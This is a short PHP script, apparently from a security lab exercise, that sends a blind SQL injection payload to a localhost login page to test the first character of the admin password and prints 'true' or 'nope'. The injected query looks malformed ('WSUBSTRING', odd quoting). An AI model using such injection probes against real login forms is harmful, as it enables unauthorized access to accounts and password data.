<?php
$url="http://localhost/lab09/login.php?u=\"%20%27admin%27%20WHERE%20WSUBSTRING(%27password%27, 0, 1) = \"a\"--%20";
$result = file_get_contents($url);

print($result);

if (strpos($result, 'cat') !== false) {
	echo "\n";
	echo 'true';
}else{
	echo "\n";
	echo "nope";
}

echo "\n";

?>